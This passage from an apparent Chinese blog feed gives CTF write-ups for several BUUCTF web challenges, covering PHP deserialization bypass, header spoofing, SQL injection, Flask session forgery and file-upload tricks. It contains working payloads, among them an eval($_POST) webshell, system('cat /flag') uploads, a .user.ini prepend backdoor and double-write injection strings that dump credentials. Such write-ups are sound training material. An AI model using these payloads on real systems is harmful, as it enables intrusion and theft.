class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码的意思，我们可以发现如果username=admin      password=100然后我们再执行__destruct()</p><p>那接下来我们可以构造反序列Pyload了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>, <span class="number">100</span>);</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205213502972.png" alt="image-20201205213502972"></p><p>反序列化unserialize()的话它是会直接执行__wake up()这个魔术方法的。那我们就要想办法让这个反序列绕过__wake up()执行_\_destruct()</p><p>而在反序列化里，当前属性个数大于实际属性个数的时候，它就会直接绕过_wake up()从而执行__destruct()的。然后我们修改一下序列化字符串（name：2改成3）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p>尝试之后居然不行？</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205214543474.png" alt="image-20201205214543474"></p><p>然后我们又意识到，这个变量是private</p><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字</p><p>段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度</p><p>于是我们在构造一回pyload:</p><p>?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205214639982.png" alt="image-20201205214639982"></p><h3 id="极客大挑战-2019-Http-1"><a href="#极客大挑战-2019-Http-1" class="headerlink" title="[极客大挑战 2019]Http 1"></a>[极客大挑战 2019]Http 1</h3><p>看看源码</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205220909356.png" alt="image-20201205220909356"></p><p>发现secret.php</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205221102544.png" alt="image-20201205221102544"></p><p>抓包修改refer头</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205221645884.png" alt="image-20201205221645884"></p><p>提示变成了Please use “Syclover” browser</p><p>修改User-agent: Syclover browser</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205221759545.png" alt="image-20201205221759545"></p><p>No!!! you can only read this locally!!</p><p>有毒？</p><p>修改X-Forwoeded-For: 127.0.0.1，得到flag</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205221926010.png" alt="image-20201205221926010"></p><h3 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="[极客大挑战 2019]Upload 1"></a>[极客大挑战 2019]Upload 1</h3><p>上传正常图片</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205223408268.png" alt="image-20201205223408268"></p><p>上传了个一句话木马，也是这样，</p><p>继续尝试，换个GIF马试试，上传shell123.jpg，回显不一样了，看来是需要GIF</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205223646430.png" alt="image-20201205223646430"></p><p>更改继续尝试</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205224207314.png" alt="image-20201205224207314"></p><p>继续尝试php3、php5、pht都失败</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205224743897.png" alt="image-20201205224743897"></p><p>最后发现phtml可以</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205224810817.png" alt="image-20201205224810817"></p><p>回显再次变成了说包含&lt;?</p><p>更改木马内容为</p> <script language='php'>@eval($_POST['cmd']);</script>  <p>再次上传</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205224934243.png" alt="image-20201205224934243"></p><p>尝试访问</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205225015752.png" alt="image-20201205225015752"></p><p>菜刀连接，找到flag</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205225157201.png" alt="image-20201205225157201"></p><h3 id="极客大挑战-2019-BabySQL-1"><a href="#极客大挑战-2019-BabySQL-1" class="headerlink" title="[极客大挑战 2019]BabySQL 1"></a>[极客大挑战 2019]BabySQL 1</h3><p>尝试万能密码username=1+or+1%3D1&amp;password=1</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205225854848.png" alt="image-20201205225854848"></p><p>单引号闭合试试</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205230013626.png" alt="image-20201205230013626"></p><p>注释掉password后面的试试，，，，，额，还是不对</p><p>换之前的用户名admin</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205230411507.png" alt="image-20201205230411507"></p><p>回显了密码</p><p>猜测列数</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205230538232.png" alt="image-20201205230538232"></p><p>or被删除了，双写试试，还是被去掉了，大写也不行</p><p>用union select 试试</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205231153819.png" alt="image-20201205231153819"></p><p>又被删除了吗？</p><p>双写试试</p><p>?username=admin’+ununionion+selselectect+1,2,3%23&amp;password=1</p><p>回显正常</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205231229789.png" alt="image-20201205231229789"></p><p>发现有三列</p><p>爆库</p><p>?username=-1’+ununionion+selselectect+1,2,database()%23&amp;password=1</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205231326467.png" alt="image-20201205231326467"></p><p>爆表</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205231606795.png" alt="image-20201205231606795"></p><p>发现from information_schema，where都被过滤，双写试试</p><p>?username=-1’+ununionion+selselectect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema=database()%23&amp;password=1</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205232043564.png" alt="image-20201205232043564"></p><p>爆列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;+ununionion+selselectect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_name=&quot;b4bsql&quot;%23&amp;password=1</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205232326740.png" alt="image-20201205232326740"></p><p>查数据</p><p>?username=-1’+ununionion+selselectect+1,2,group_concat(username,”-“,passwoorrd)+frfromom+b4bsql%23&amp;password=1 </p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205232558100.png" alt="image-20201205232558100"></p><h3 id="HCTF-2018-admin1"><a href="#HCTF-2018-admin1" class="headerlink" title="[HCTF 2018]admin1"></a>[HCTF 2018]admin1</h3><p>注册之后，登录</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206141327995.png" alt="image-20201206141327995"></p><p>查看源码</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206141352225.png" alt="image-20201206141352225"></p><p>只写着说youarenotadmin，要想办法变成admin了</p><p>于是就使用账号admin密码123发现直接就能等进去了。而且首页就显示出falg了，不感相信退出去输入密码123123发现显示密码错误。推测admin的密码真的是123。感觉考点肯定不是弱密码，估计是作者没太在意，假装不知道密码继续做下去。</p><p> 在登陆的情况下能访问三个页面<code>index</code>、<code>posts</code>、<code>edit</code>、<code>change</code>。逐个看看有没有什么能利用的地方。 </p><p>​        index页面和之前的index页面查看源代码是一样的。<br>​        posts页面进入只会显示404，就算再后面新增了文章也是一样。<br>​        edit页面是一个类似博客编写页面，有两个文本框，但试了一下XSS都被过滤了。<br>​        change页面是一个修改密码的页面。可能存在逻辑漏洞，尝试一下。</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206150605538.png" alt="image-20201206150605538"></p><p>​        发现不需要输入之前的密码直接输入新密码就行，这样就不存在多步骤校验可能存在的逻辑绕过。</p><p>​        <img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206150644552.png" alt="image-20201206150644552"></p><p>​        查看报文发现报文中没有写用户名，里面只有一个新密码。证明用户名是通过session来获取的，所以也不存在中间截获修改的漏洞。但在修改密码页面的源代码中发现提示了我们整个工程的Git地址。</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206152052920.png" alt="image-20201206152052920"></p><p>拿到源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(&#x27;header.html&#x27;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 可以从上面<code>index</code>页面模板看出只要从session中得到的值<code>name</code>为admin就会显示<code>flag</code>。</p><p>查阅资料得知，flask 是非常轻量级的 Web框架 ，其 session  存储在客户端中，也就是说其实只是将相关内容进行了加密保存到session中。和服务端的session不同，服务端的session保存在服务端中，依靠客户端cookie值中的sessionId来进行识别。本身sessionId是没有价值的，而客户端的session是可以被截取破解后得到有价值的原文。在网上找了一个解密的脚本： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.html</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    s = <span class="string">&quot;.eJw9kMGKwkAQRH9l6bOHJGYvgoeVSSRCd1AmCdMXcTUmM9l2ISqaEf99gyye6lDFo6oesD329bmF2aW_1hPY2gPMHvDxDTMwkgy5LmKjM48qG3JVxOhLy24fYmViUqOqRWsEQ_LJ3bhuyi4VE43ZKm1Z4Y1V-kOuuKOkNtelY2Ui41qLah1QVQR5VVqjvzxV2UCqFF6WkquFxWhjWXU-r4qB_KojnUTsmph0EbCUbux0Yz3mXTJlyebwnMD-3B-3l9-uPr0noN6PE8ixxk_UGJOsb7wcq4kJaMkd641D10SkW8t65civB9PMXzgru6Z-k0guAf47p52MBuwOYk8hTOB6rvvXcRAG8PwD9uBt8Q.X8yKzg.NjWoGG8XKlG6tjeTodQ8RB7yquQ&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(decryption(s.encode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206154108690.png" alt="image-20201206154108690"></p><p>可以看到能解密出来原来的内容，能看到很明显一个是name字段正是我们之前注册的test。那只要改一下这个值，然后重新加密一下就可以了。加密的脚本看大佬的writeup上有个地址：<a href="https://github.com/noraj/flask-session-cookie-manager%E3%80%82%E6%8B%BF%E5%88%B0%E5%90%8E%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%E5%8D%B3%E5%8F%AF%E3%80%82%E5%8A%A0%E5%AF%86%E8%BF%98%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%E5%80%BCSECRET_KEY%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9C%A8config.py%E4%B8%AD%E8%83%BD%E7%9C%8B%E5%88%B0%E3%80%82">https://github.com/noraj/flask-session-cookie-manager。拿到后直接使用即可。加密还需要一个值SECRET_KEY，这个在config.py中能看到。</a></p><p>伪造flask session还需要一个SECRET_KEY</p><p>我们发现config.py中存在，SECRET_KEY = os.environ.get(‘SECRET_KEY’) or ‘ckj123’flask session加密脚本<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>payload:伪造的session</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;2ff34a5077d2f711c7aa5fb35b61ebe2d8cf4081a56609f46c43d95e51de0efa5713b6d78b48664e4d4bbf4aabb1fd6b6484b97d2b48997ce7a83878b78781d1&#x27;, &#x27;csrf_token&#x27;: b&#x27;44463a5670f0c0ad61ab0d2dc0ae725a14808b81&#x27;, &#x27;image&#x27;: b&#x27;MAuE&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206154739515.png" alt="image-20201206154739515"></p><p>替换掉原来的session即可</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206154815618.png" alt="image-20201206154815618"></p><h3 id="ACTF2020-新生赛-Upload1"><a href="#ACTF2020-新生赛-Upload1" class="headerlink" title="[ACTF2020 新生赛]Upload1"></a>[ACTF2020 新生赛]Upload1</h3><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206155541463.png" alt="image-20201206155541463"></p><p>上传正常图片返回路径，并且可以访问</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206155656232.png" alt="image-20201206155656232"></p><p>上传php文件，回显如上，应该是前端的白名单校验，更改后缀名上传</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206160053725.png" alt="image-20201206160053725"></p><p>可见知识校验后缀名，但是访问之后，php未被解析</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206160127612.png" alt="image-20201206160127612"></p><p>后来发现phtml可以绕过，但是php没解析？</p><p>换成js</p><script language='php'>system("cat /flag");</script><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206162054068.png" alt="image-20201206162054068"></p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206162106152.png" alt="image-20201206162106152"></p><h3 id="ACTF2020-新生赛-BackupFile1"><a href="#ACTF2020-新生赛-BackupFile1" class="headerlink" title="[ACTF2020 新生赛]BackupFile1"></a>[ACTF2020 新生赛]BackupFile1</h3><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206164026421.png" alt="image-20201206164026421"></p><p>​    在index.php.bak中找到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入一个key，这个key必须是数字，但是还必须要和str相等，按理来说是不可能的，但是这里用的是==，php中存在弱比较问题，即123和123xxxxx是相等的，它只会取字符串前面的数字进行比较</p><p>所以payload：?key=123</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206171115527.png" alt="image-20201206171115527"></p><h3 id="SUCTF-2019-CheckIn1"><a href="#SUCTF-2019-CheckIn1" class="headerlink" title="[SUCTF 2019]CheckIn1"></a>[SUCTF 2019]CheckIn1</h3><p> 提交一个正常文件 </p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206174807392.png" alt="image-20201206174807392"></p><p>显示有&lt;?，不能写php马，写js的马，又提示内容不是图片，所以再加上GIF89a头，即可绕过，</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206175235243.png" alt="image-20201206175235243"></p><p>菜刀连不上？。。。。。。</p><p>百度一下，哦，是要利用.user.ini文件</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206181514369.png" alt="image-20201206181514369"></p><p>条件：</p><ul><li>1、服务器脚本语言为PHP</li><li>2、服务器使用CGI／FastCGI模式</li><li>3、上传目录下要有可执行的php文件</li></ul><p>上传<code>.user.ini</code>绕过黑名单检验</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  //绕过exif_imagetype()</span><br><span class="line">auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</span><br><span class="line">auto_append_file=a.jpg  //解析后进行包含</span><br></pre></td></tr></table></figure><p> 优势：跟<code>.htaccess</code>后门比，适用范围更广，nginx/apache/IIS都有效，而<code>.htaccess</code>只适用于apache </p><p>上传这样的一个ini文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=shell.jpg</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206181743642.png" alt="image-20201206181743642"></p><p>再上传我们之前的shell.jpg</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206181849837.png" alt="image-20201206181849837"></p><p>访问index.php， 注意：上传目录下要有一个正常的php文件，这里为index.php </p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206182056945.png" alt="image-20201206182056945"></p><p>菜刀连接</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206182140524.png" alt="image-20201206182140524"></p><p>一直连不上，，换个马</p><script language='php'>system("cat /flag");</script><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206182238440.png" alt="image-20201206182238440"></p><p>直接读取</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206182252029.png" alt="image-20201206182252029"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;​    学如逆水行舟，不进则退&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>绕过非英文字母和数字getshell</title>
    <link href="http://example.com/2019/10/16/%E5%A4%A7%E5%AD%A6CTF/%E7%BB%95%E8%BF%87%E9%9D%9E%E8%8B%B1%E6%96%87%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97getshell/"/>
    <id>http://example.com/2019/10/16/%E5%A4%A7%E5%AD%A6CTF/%E7%BB%95%E8%BF%87%E9%9D%9E%E8%8B%B1%E6%96%87%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97getshell/</id>
    <published>2019-10-16T07:55:41.000Z</published>
    <updated>2019-10-16T08:01:10.363Z</updated>
    
